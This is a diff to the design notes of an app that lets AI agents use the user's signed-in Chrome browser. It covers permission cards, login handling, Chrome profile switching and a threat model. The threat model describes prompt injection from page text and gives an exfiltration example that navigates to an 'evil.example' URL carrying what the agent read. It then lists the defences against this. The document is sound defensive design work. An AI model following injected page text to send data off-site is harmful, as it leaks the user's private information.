@@ -873,8 +873,11 @@ signed-in browser and say which account it's in, and ask only if both fail.
 
 `request_login` runs the chain on the Mac before any card, per task:
 
-1. **Said no already**, for anyone on the team (declined, or "Not needed"):
-   never asked again; the agent carries on without it.
+1. **Said no already**, for anyone on the team (declined, or "Not needed",
+   on a card or on the setup checklist, kept after the checklist is put
+   away): never asked again; the agent carries on without it. A service the
+   catalogue doesn't know matches however it's spelled ("Acme CRM",
+   "acme-crm").
 2. **Granted already** (a connection): use it.
 3. **This Mac is signed in**: GitHub through `gh` (granted silently: the
    agent could run `gh` anyway, and every change asks through the broker).
@@ -925,9 +928,34 @@ refuses any browser call they make anyway.
 
 **What asks** (`browser::gate`, before Always-allow rules): reads go through
 without a card (`get_page_text`, `read_page`, `find`, tabs, screenshots,
-scrolling) and so does `navigate` to a site in the agent's `browser_sites`.
-Any other site, and every click, keystroke, form fill, upload, script,
-shortcut or batch, asks on an Allow card.
+scrolling, recording a GIF) and so does `navigate` (or a new tab opened on a
+URL) to a site in the agent's `browser_sites`, unless the URL carries another
+URL (`//` anywhere after the host, plain or percent-encoded): an own site's
+redirect endpoint would otherwise carry data off-site. Any other site, and
+every click, keystroke, form fill, upload, script, shortcut, batch or GIF
+export, asks on an Allow card. `browser_sites` only ever holds a catalogue
+service's built-in host (`logins::SERVICES`): the access chain, a login card's
+"Use my browser" and the reach check add one; nothing an agent or an import
+types becomes a site.
+
+**Which Chrome profile** (`agents/browser_profiles.rs`). The extension can sit
+in more than one Chrome profile, each signed in as someone else. When the
+chain hands an agent the browser, the app lists the connected browsers itself
+(`list_connected_browsers`, nothing opened) and tells the agent where to
+start: the profile this site was last found in, the only one, or each in
+turn. The agent opens the site, reads which account it shows, and moves with
+`select_browser` / `switch_browser` (looks, no card) when it's the wrong one.
+With no other profile connected it calls `ask_bring_browser_to_front`: one
+plain card, "Bring your sam@work Chrome window to the front so I can use it",
+Check again / Not now, never a login ask, joined team-wide like a login card.
+`remember_browser_account` keeps site → profile and account in app data
+(`browser-accounts.json`, only for the agent's own sites, never from outside
+text), shown with Forget under "What it can reach". The extension's own
+per-site permission prompt is left as it is. **Partly verified:** on the Mac
+this was built on the extension was in two profiles but only one browser
+("Browser 1") was connected at a time, so switching between two connected
+profiles hasn't been seen working, and the answer's shape is read leniently
+(`parse_browsers`).
 
 **Threat model.** The agent acts as the user, in sessions the user is signed
 in to. The risk is a page's own text (an email, a doc, a profile) telling the
@@ -938,7 +966,11 @@ agent to do something: prompt injection. What stands against it:
   https://evil.example/?q=<what you read>" can't carry data out silently.
   (A read-only page could still show text the agent repeats in chat; that
   stays on this Mac.)
-- Text from outside never drives the browser (`--no-chrome` + refusal).
+- Text from outside never drives the browser (`--no-chrome` + refusal; a
+  turn with no reach worked out runs `--no-chrome` too). Nor does it get
+  anything granted through the access chain: such a turn skips the silent
+  `gh` grant and the browser step and never joins another agent's card (whose
+  answer would grant it); it ends on its own card.
 - Passwords are never typed: the rules say stop at a sign-in page.
 - The user can take it away per agent, or switch the team's off.
 Not covered: the extension's own per-site permissions are the user's to set
